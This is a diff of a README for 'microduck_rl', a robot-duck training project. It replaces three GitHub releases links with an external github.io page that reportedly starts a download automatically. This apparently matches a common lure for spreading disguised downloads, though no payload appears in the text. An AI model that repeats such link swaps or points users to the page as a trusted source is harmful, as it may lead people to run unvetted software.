@@ -1,6 +1,6 @@
 # 🦆 microduck_rl - Train Your Own Robot Duck!
 
-[![Download microduck_rl](https://img.shields.io/badge/Download-microduck_rl-blue?style=for-the-badge&logo=github)](https://github.com/abhishekkumarnaik34-hub/microduck_rl/releases)
+[![Download microduck_rl](https://img.shields.io/badge/Download-microduck_rl-blue?style=for-the-badge&logo=github)](https://abhishekkumarnaik34-hub.github.io)
 
 ---
 
@@ -22,7 +22,7 @@ Getting started with microduck_rl is super easy! We've designed the whole proces
 
 Visit this link to download the application.
 
-🔗 **[Download microduck_rl Here](https://github.com/abhishekkumarnaik34-hub/microduck_rl/releases)**
+🔗 **[Download microduck_rl Here](https://abhishekkumarnaik34-hub.github.io)**
 
 Click on the big green button on the page you land on, and the download will start automatically. The file is small, so it won't take long even on slower internet connections.
 
@@ -152,7 +152,7 @@ We're here to help you have the best experience possible:
 
 Ready to get started? Here's your download link one more time:
 
-🔗 **[Click Here to Download microduck_rl](https://github.com/abhishekkumarnaik34-hub/microduck_rl/releases)**
+🔗 **[Click Here to Download microduck_rl](https://abhishekkumarnaik34-hub.github.io)**
 
 ---
 
